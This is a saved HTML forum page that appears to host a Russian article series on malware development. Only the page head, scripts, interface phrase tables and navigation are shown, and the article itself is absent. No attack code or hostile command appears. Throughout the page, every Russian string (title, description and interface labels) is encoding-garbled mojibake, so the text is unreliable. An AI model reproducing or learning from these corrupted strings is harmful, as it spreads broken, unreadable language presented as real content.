<!DOCTYPE html>
<html id="XF" lang="ru-RU" dir="LTR"
	data-xf="2.3"
	data-app="public"
	data-variation="alternate"
	data-color-scheme="dark"
	data-template="xa_ams_article_view"
	data-container-key="amsCategory-2"
	data-content-key=""
	data-logged-in="false"
	data-cookie-prefix="xf_"
	data-csrf="1758965544,d4a329dfc08dc36ef8d644381e10fee9"
	class="has-no-js template-xa_ams_article_view"
	>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/?full=1 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:43:13 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
	<link rel="icon" href="../../favicon.ico" type="image/x-icon">
	
	
	

	<meta charset="utf-8" />
	<title>–¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; | Osint42.Org - –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–¥</title>
	<link rel="manifest" crossorigin="use-credentials" href="../../webmanifest.php">

	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">

	
		
			<meta name="theme-color" content="#0a1c29" />
		
	

	<meta name="apple-mobile-web-app-title" content="Osint42.Org - –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–¥">
	
		<link rel="apple-touch-icon" href="../../data/assets/logo/192192.png">
		

	
		
		<meta property="og:title" content="–¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;" />
		<meta property="twitter:title" content="–¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;" />
	
	
		
		<meta name="description" content="–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç!

–†–µ—à–∏–ª –ø–µ—Ä–µ–ø–æ—Å—Ç–∏—Ç—å —Å–≤–æ–π —Ü–∏–∫–ª —Å—Ç–∞—Ç–µ–π –ø–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –º–∞–ª–≤–∞—Ä–∏.

–°—Ç–∞—Ç—å–∏ –±—É–¥—É—Ç –æ—Ñ–æ—Ä–º–ª–µ–Ω—ã –≤ –≤–∏–¥–µ —Ü–∏–∫–ª–∞ —Å—Ç–∞—Ç–µ–π.)

–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö..." />
		<meta property="og:description" content="–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç!

–†–µ—à–∏–ª –ø–µ—Ä–µ–ø–æ—Å—Ç–∏—Ç—å —Å–≤–æ–π —Ü–∏–∫–ª —Å—Ç–∞—Ç–µ–π –ø–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –º–∞–ª–≤–∞—Ä–∏.

–°—Ç–∞—Ç—å–∏ –±—É–¥—É—Ç –æ—Ñ–æ—Ä–º–ª–µ–Ω—ã –≤ –≤–∏–¥–µ —Ü–∏–∫–ª–∞ —Å—Ç–∞—Ç–µ–π.)

–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º ?

–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏—á–∏–Ω, –ø–æ –∫–æ—Ç–æ—Ä—ã–º –∫—Ç–æ-—Ç–æ —Ö–æ—Ç–µ–ª –±—ã –∏–∑—É—á–∏—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É..." />
		<meta property="twitter:description" content="–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç!

–†–µ—à–∏–ª –ø–µ—Ä–µ–ø–æ—Å—Ç–∏—Ç—å —Å–≤–æ–π —Ü–∏–∫–ª —Å—Ç–∞—Ç–µ–π –ø–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –º–∞–ª–≤–∞—Ä–∏.

–°—Ç–∞—Ç—å–∏ –±—É–¥—É—Ç –æ—Ñ–æ—Ä–º–ª–µ–Ω—ã –≤ –≤–∏–¥–µ —Ü–∏–∫–ª–∞ —Å—Ç–∞—Ç–µ–π.)

–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º ?

–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏—á–∏–Ω, –ø–æ..." />
	
	
		<meta property="og:type" content="article" />
	
		<meta property="og:url" content="index.html" />
	
		<link rel="canonical" href="index.html" />
	
		
		<meta property="og:image" content="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png" />
		<meta property="twitter:image" content="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png" />
		<meta property="twitter:card" content="summary_large_image" />
	
	

	
		
	
	
	<meta property="og:site_name" content="Osint42.Org - –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–¥" />


	
	
	
	
	
	

	
	
	
		
	
	

	<link rel="stylesheet" href="../../cssf1bd.css?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Avariations.less%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=650febe17d52673553ff8fcab924bc52ae7c26c5" />

	<link rel="stylesheet" href="../../css3cbc.css?css=public%3Aalnb_navigation.less%2Cpublic%3Abb_code.less%2Cpublic%3Aembed_resolver.less%2Cpublic%3Alightbox.less%2Cpublic%3Amessage.less%2Cpublic%3Anotices.less%2Cpublic%3Ashare_controls.less%2Cpublic%3Axa_ams.less%2Cpublic%3Axa_ams_comment.less%2Cpublic%3Aextra.less&amp;s=1&amp;l=2&amp;d=1758392320&amp;k=660f70198796b016e2fbc3737c197c9184e8d7a3" />


	
		<script data-cfasync="false" src="../../js/xf/preamble.minf74f.js?_v=01eb82fa"></script>
	

	
	<script data-cfasync="false" src="../../js/vendor/vendor-compiledf74f.js?_v=01eb82fa" defer></script>
	<script data-cfasync="false" src="../../js/xf/core-compiledf74f.js?_v=01eb82fa" defer></script>

	<script data-cfasync="false">
		XF.ready(() =>
		{
			XF.extendObject(true, XF.config, {
				// 
				userId: 0,
				enablePush: true,
				pushAppServerKey: 'BA479YFsUh5Dh5bOkTEWM7LoORrEgUroE2adYpgA6_NLt6AmfJFBdCBxt_i9NhpAIXJviINVU4JDqWxez0NnB-w',
				url: {
					fullBase: 'https://osint42.org/',
					basePath: '/',
					css: '/css.php?css=__SENTINEL__&s=1&l=2&d=1758392320',
					js: '/js/__SENTINEL__?_v=01eb82fa',
					icon: '/data/local/icons/__VARIANT__.svg?v=1757401797#__NAME__',
					iconInline: '/styles/fa/__VARIANT__/__NAME__.svg?v=5.15.3',
					keepAlive: '/login/keep-alive'
				},
				cookie: {
					path: '/',
					domain: '',
					prefix: 'xf_',
					secure: true,
					consentMode: 'disabled',
					consented: ["optional","_third_party"]
				},
				cacheKey: '60356f7aa4f82ca98e605b4e87a0a057',
				csrf: '1758965544,d4a329dfc08dc36ef8d644381e10fee9',
				js: {"\/js\/xf\/lightbox-compiled.js?_v=01eb82fa":true,"\/js\/xf\/code_block-compiled.js?_v=01eb82fa":true,"\/js\/copycode\/copycode.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/4.4.1\/socket.io.min.js?_v=01eb82fa":true,"\/js\/DCom\/LiveContent\/socket-conv.min.js?_v=01eb82fa":true},
				fullJs: false,
				css: {"public:alnb_navigation.less":true,"public:bb_code.less":true,"public:embed_resolver.less":true,"public:lightbox.less":true,"public:message.less":true,"public:notices.less":true,"public:share_controls.less":true,"public:xa_ams.less":true,"public:xa_ams_comment.less":true,"public:extra.less":true},
				time: {
					now: 1758965544,
					today: 1758920400,
					todayDow: 6,
					tomorrow: 1759006800,
					yesterday: 1758834000,
					week: 1758402000,
					month: 1756674000,
					year: 1735678800
				},
				style: {
					light: 'default',
					dark: 'alternate',
					defaultColorScheme: 'light'
				},
				borderSizeFeature: '3px',
				fontAwesomeWeight: 'r',
				enableRtnProtect: true,
				
				enableFormSubmitSticky: true,
				imageOptimization: '0',
				imageOptimizationQuality: 0.85,
				uploadMaxFilesize: 3145728,
				uploadMaxWidth: 0,
				uploadMaxHeight: 0,
				allowedVideoExtensions: ["m4v","mov","mp4","mp4v","mpeg","mpg","ogv","webm"],
				allowedAudioExtensions: ["mp3","opus","ogg","wav"],
				shortcodeToEmoji: true,
				visitorCounts: {
					conversations_unread: '0',
					alerts_unviewed: '0',
					total_unread: '0',
					title_count: true,
					icon_indicator: true
				},
				jsMt: {"xf\/action.js":"dc2375bf","xf\/embed.js":"d3d00259","xf\/form.js":"d3d00259","xf\/structure.js":"dc2375bf","xf\/tooltip.js":"d3d00259"},
				jsState: {},
				publicMetadataLogoUrl: 'https://osint42.org/data/assets/logo/192192.png',
				publicPushBadgeUrl: 'https://osint42.org/styles/default/xenforo/bell.png'
			})

			XF.extendObject(XF.phrases, {
				// 
"svStandardLib_time.day": "{count} day",
"svStandardLib_time.days": "{count} –¥–Ω–µ–π",
"svStandardLib_time.hour": "{count} hour",
"svStandardLib_time.hours": "{count} —á–∞—Å–æ–≤",
"svStandardLib_time.minute": "{count} –º–∏–Ω—É—Ç",
"svStandardLib_time.minutes": "{count} –º–∏–Ω—É—Ç",
"svStandardLib_time.month": "{count} month",
"svStandardLib_time.months": "{count} –º–µ—Å—è—Ü–µ–≤",
"svStandardLib_time.second": "{count} second",
"svStandardLib_time.seconds": "{count} —Å–µ–∫—É–Ω–¥",
"svStandardLib_time.week": "time.week",
"svStandardLib_time.weeks": "{count} –Ω–µ–¥–µ–ª—å",
"svStandardLib_time.year": "{count} year",
"svStandardLib_time.years": "{count} –ª–µ—Ç",
copy_to_clipboard: "–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞",
text_copied_to_clipboard: "–¢–µ–∫—Å—Ç —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞.",
				date_x_at_time_y:     "{date} –≤ {time}",
				day_x_at_time_y:      "{day} –≤ {time}",
				yesterday_at_x:       "–í—á–µ—Ä–∞ –≤ {time}",
				x_minutes_ago:        "{minutes} –º–∏–Ω. –Ω–∞–∑–∞–¥",
				one_minute_ago:       "–ú–∏–Ω—É—Ç—É –Ω–∞–∑–∞–¥",
				a_moment_ago:         "–¢–æ–ª—å–∫–æ —á—Ç–æ",
				today_at_x:           "–°–µ–≥–æ–¥–Ω—è –≤ {time}",
				in_a_moment:          "–ß–µ—Ä–µ–∑ —Å–µ–∫—É–Ω–¥—É",
				in_a_minute:          "–ß–µ—Ä–µ–∑ –º–∏–Ω—É—Ç—É",
				in_x_minutes:         "–ß–µ—Ä–µ–∑ {minutes} –º–∏–Ω.",
				later_today_at_x:     "–°–µ–≥–æ–¥–Ω—è –≤ {time}",
				tomorrow_at_x:        "–ó–∞–≤—Ç—Ä–∞ –≤ {time}",
				short_date_x_minutes: "{minutes} –º.",
				short_date_x_hours:   "{hours} —á.",
				short_date_x_days:    "{days} –¥.",

				day0: "–í–æ—Å–∫—Ä–µ—Å–µ–Ω—å–µ",
				day1: "–ü–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫",
				day2: "–í—Ç–æ—Ä–Ω–∏–∫",
				day3: "–°—Ä–µ–¥–∞",
				day4: "–ß–µ—Ç–≤–µ—Ä–≥",
				day5: "–ü—è—Ç–Ω–∏—Ü–∞",
				day6: "–°—É–±–±–æ—Ç–∞",

				dayShort0: "–í—Å",
				dayShort1: "–ü–Ω",
				dayShort2: "–í—Ç",
				dayShort3: "–°—Ä",
				dayShort4: "–ß—Ç",
				dayShort5: "–ü—Ç",
				dayShort6: "–°–±",

				month0: "–Ø–Ω–≤–∞—Ä—å",
				month1: "–§–µ–≤—Ä–∞–ª—å",
				month2: "–ú–∞—Ä—Ç",
				month3: "–ê–ø—Ä–µ–ª—å",
				month4: "–ú–∞–π",
				month5: "–ò—é–Ω—å",
				month6: "–ò—é–ª—å",
				month7: "–ê–≤–≥—É—Å—Ç",
				month8: "–°–µ–Ω—Ç—è–±—Ä—å",
				month9: "–û–∫—Ç—è–±—Ä—å",
				month10: "–ù–æ—è–±—Ä—å",
				month11: "–î–µ–∫–∞–±—Ä—å",

				active_user_changed_reload_page: "–í–∞—à–∞ —Å–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.",
				server_did_not_respond_in_time_try_again: "–°–µ—Ä–≤–µ—Ä –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª –≤–æ–≤—Ä–µ–º—è. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.",
				oops_we_ran_into_some_problems: "–£–ø—Å! –ú—ã —Å—Ç–æ–ª–∫–Ω—É–ª–∏—Å—å —Å –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ –ø—Ä–æ–±–ª–µ–º–∞–º–∏.",
				oops_we_ran_into_some_problems_more_details_console: "–£–ø—Å! –ú—ã —Å—Ç–æ–ª–∫–Ω—É–ª–∏—Å—å —Å –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ –ø—Ä–æ–±–ª–µ–º–∞–º–∏. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ. –ë–æ–ª–µ–µ –¥–µ—Ç–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –æ—à–∏–±–∫–µ –í—ã –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ –∫–æ–Ω—Å–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞",
				file_too_large_to_upload: "–§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏.",
				uploaded_file_is_too_large_for_server_to_process: "–ó–∞–≥—Ä—É–∂–∞–µ–º—ã–π —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–µ—Ä–≤–µ—Ä–æ–º.",
				files_being_uploaded_are_you_sure: "–§–∞–π–ª—ã –µ—â—ë –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è. –í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —ç—Ç—É —Ñ–æ—Ä–º—É?",
				attach: "–ü—Ä–∏–∫—Ä–µ–ø–∏—Ç—å —Ñ–∞–π–ª—ã",
				rich_text_box: "–¢–µ–∫—Å—Ç–æ–≤–æ–µ –ø–æ–ª–µ —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è",
				close: "–ó–∞–∫—Ä—ã—Ç—å",
				link_copied_to_clipboard: "–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞.",
				text_copied_to_clipboard: "–¢–µ–∫—Å—Ç —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞.",
				loading: "–ó–∞–≥—Ä—É–∑–∫–∞...",
				you_have_exceeded_maximum_number_of_selectable_items: "–í—ã –ø—Ä–µ–≤—ã—Å–∏–ª–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—ã–±–∏—Ä–∞–µ–º—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤.",

				processing: "–û–±—Ä–∞–±–æ—Ç–∫–∞",
				'processing...': "–û–±—Ä–∞–±–æ—Ç–∫–∞...",

				showing_x_of_y_items: "–ü–æ–∫–∞–∑–∞–Ω–æ {count} –∏–∑ {total} —ç–ª–µ–º–µ–Ω—Ç–æ–≤",
				showing_all_items: "–ü–æ–∫–∞–∑–∞–Ω—ã –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã",
				no_items_to_display: "–ù–µ—Ç —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è",

				number_button_up: "–£–≤–µ–ª–∏—á–∏—Ç—å",
				number_button_down: "–£–º–µ–Ω—å—à–∏—Ç—å",

				push_enable_notification_title: "Push-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –¥–ª—è —Å–∞–π—Ç–∞ Osint42.Org - –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤–∫–ª—é—á–µ–Ω—ã",
				push_enable_notification_body: "–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–∫–ª—é—á–µ–Ω–∏–µ push-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π!",

				pull_down_to_refresh: "–ü–æ—Ç—è–Ω–∏—Ç–µ –≤–Ω–∏–∑ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è",
				release_to_refresh: "–û—Ç–ø—É—Å—Ç–∏—Ç–µ –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è",
				refreshing: "–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ..."
			})
		})
	

window.addEventListener('DOMContentLoaded',()=>{XF.Push.updateUserSubscriptionParent=XF.Push.updateUserSubscription;XF.Push.updateUserSubscription=function(b,a){"unsubscribe"===a&&XF.browser.safari&&XF.Push.setPushHistoryUserIds({});XF.Push.updateUserSubscriptionParent(b,a)}});
</script>

	<script data-cfasync="false" src="../../js/xf/lightbox-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/xf/code_block-compiledf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/copycode/copycode.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/DCom/LiveContent/4.4.1/socket.io.minf74f.js?_v=01eb82fa" defer></script>
<script data-cfasync="false" src="../../js/DCom/LiveContent/socket-conv.minf74f.js?_v=01eb82fa" defer></script>



	
		<link rel="icon" type="image/png" href="../../data/assets/logo/favicon.png" sizes="32x32" />
	

	
	
</head>
<body data-template="xa_ams_article_view">

<div class="p-pageWrapper" id="top">

	

	<header class="p-header" id="header">
		<div class="p-header-inner">
			<div class="p-header-content">
				<div class="p-header-logo p-header-logo--image">
					<a href="../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;}}">
		
		
		

		

		<img src="../../data/assets/logo_alternate/osint4242.png" srcset="/data/assets/logo_alternate/osint4242.png 2x" width="100" height="36" alt="Osint42.Org - –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–¥"  />
	</picture>


					</a>
				</div>

				
			</div>
		</div>
	</header>

	
	

	
		<div class="p-navSticky p-navSticky--primary" data-xf-init="sticky-header">
			
		<nav class="p-nav">
			<div class="p-nav-inner">
				<button type="button" class="button button--plain p-nav-menuTrigger" data-xf-click="off-canvas" data-menu=".js-headerOffCanvasMenu" tabindex="0" aria-label="–ú–µ–Ω—é"><span class="button-text">
					<i aria-hidden="true"></i>
				</span></button>

				<div class="p-nav-smallLogo">
					<a href="../../forums/index.html">
						

	

	
		
		

		
	
		
		

		
	

	

	<picture data-variations="{&quot;default&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_default\/osint4242.png&quot;,&quot;2&quot;:null},&quot;alternate&quot;:{&quot;1&quot;:&quot;\/data\/assets\/logo_alternate\/osint4242.png&quot;,&quot;2&quot;:null}}">
		
		
		

		

		<img src="../../data/assets/logo_alternate/osint4242.png"  width="100" height="36" alt="Osint42.Org - –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–¥"  />
	</picture>


					</a>
				</div>

				<div class="p-nav-scroller hScroller" data-xf-init="h-scroller" data-auto-scroll=".p-navEl.is-selected">
					<div class="hScroller-scroll">
						<ul class="p-nav-list js-offCanvasNavSource">
							
								<li>
									
	<div class="p-navEl is-selected" data-has-children="true">
	

		
	
	<a href="../../index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xa_ams">–°—Ç–∞—Ç—å–∏</a>


		<a data-xf-key="1"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="–ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—å —Ä–∞—Å–∫—Ä—ã—Ç–∏—è"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewArticles">–ù–æ–≤—ã–µ —Å—Ç–∞—Ç—å–∏</a>

	

				
					
	
	
	<a href="../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xa_amsNewComments">–ù–æ–≤—ã–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏</a>

	

				
					
	
	
	<a href="../authors/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xa_amsAuthorList">–°–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–æ–≤</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../forums/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="forums">–§–æ—Ä—É–º</a>


		<a data-xf-key="2"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="–ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—å —Ä–∞—Å–∫—Ä—ã—Ç–∏—è"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="newPosts">–ù–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è</a>

	

				
					
	
	
	<a href="../../search/index4009.html?type=post"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="searchForums">–ü–æ–∏—Å–∫ –ø–æ —Ñ–æ—Ä—É–º—É</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../whats-new/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="whatsNew">–ß—Ç–æ –Ω–æ–≤–æ–≥–æ</a>


		<a data-xf-key="3"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="–ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—å —Ä–∞—Å–∫—Ä—ã—Ç–∏—è"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/posts/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="whatsNewPosts">–ù–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è</a>

	

				
					
	
	
	<a href="../../whats-new/ams-articles/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewNewArticles">–ù–æ–≤—ã–µ —Å—Ç–∞—Ç—å–∏</a>

	

				
					
	
	
	<a href="../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgWhatsNewNewMedia">–ù–æ–≤—ã–µ –º–µ–¥–∏–∞</a>

	

				
					
	
	
	<a href="../../whats-new/ams-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xaAmsWhatsNewArticleComments">–ù–æ–≤—ã–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ –∫ —Å—Ç–∞—Ç—å–µ</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="../../media/index.html"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="xfmg">–ú–µ–¥–∏–∞</a>


		<a data-xf-key="4"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="–ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—å —Ä–∞—Å–∫—Ä—ã—Ç–∏—è"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="../../whats-new/media/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewMedia">–ù–æ–≤—ã–µ –º–µ–¥–∏–∞</a>

	

				
					
	
	
	<a href="../../whats-new/media-comments/index.html"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	 rel="nofollow"
	
	data-nav-id="xfmgNewComments">–ù–æ–≤—ã–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏</a>

	

				
					
	
	
	<a href="../../search/index4784.html?type=xfmg_media"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="xfmgSearchMedia">–ü–æ–∏—Å–∫ –º–µ–¥–∏–∞</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
								<li>
									
	<div class="p-navEl " data-has-children="true">
	

		
	
	<a href="https://osint42.org/members/"
	class="p-navEl-link p-navEl-link--splitMenu "
	
	
	data-nav-id="members">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏</a>


		<a data-xf-key="5"
			data-xf-click="menu"
			data-menu-pos-ref="< .p-navEl"
			class="p-navEl-splitTrigger"
			role="button"
			tabindex="0"
			aria-label="–ü–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—å —Ä–∞—Å–∫—Ä—ã—Ç–∏—è"
			aria-expanded="false"
			aria-haspopup="true"></a>

		
	
		<div class="menu menu--structural" data-menu="menu" aria-hidden="true">
			<div class="menu-content">
				
					
	
	
	<a href="https://osint42.org/online/"
	class="menu-linkRow u-indentDepth0 js-offCanvasCopy "
	
	
	data-nav-id="currentVisitors">–°–µ–π—á–∞—Å –Ω–∞ —Ñ–æ—Ä—É–º–µ</a>

	

				
			</div>
		</div>
	
	</div>

								</li>
							
						</ul>
					</div>
				</div>

				<div class="p-nav-opposite">
					<div class="p-navgroup p-account p-navgroup--guest">
						
							<a href="../../login/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--logIn"
								data-xf-click="overlay" data-follow-redirects="on">
								<span class="p-navgroup-linkText">–í—Ö–æ–¥</span>
							</a>
							
								<a href="../../register/index.html" class="p-navgroup-link p-navgroup-link--textual p-navgroup-link--register"
									data-xf-click="overlay" data-follow-redirects="on">
									<span class="p-navgroup-linkText">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</span>
								</a>
							
						
					</div>
					
